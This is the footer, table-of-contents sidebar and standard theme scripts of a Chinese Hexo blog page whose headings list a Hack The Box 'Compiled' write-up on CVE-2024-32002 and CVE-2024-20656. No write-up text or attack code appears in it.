+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">AyMeow</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0">Stellar 1.27.0</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB-Compiled-Write-up"><span class="toc-text">HTB-Compiled_Write-up</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87"><span class="toc-text">1.前期准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">2.信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-CVE-2024-32002%E5%A4%8D%E7%8E%B0"><span class="toc-text">3.CVE-2024-32002复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Msf%E4%B8%8A%E7%BA%BF"><span class="toc-text">Msf上线</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E8%8E%B7%E5%8F%96User-txt"><span class="toc-text">4.获取User.txt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E8%8E%B7%E5%8F%96Root-txt%EF%BC%88CVE-2024-20656%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-text">5.获取Root.txt（CVE-2024-20656复现）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E6%80%BB%E7%BB%93"><span class="toc-text">6.总结</span></a></li></ol></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.27.0" async></script>
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || null
+        }
+      });
+    })
+  }
+</script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          loop: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script><script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
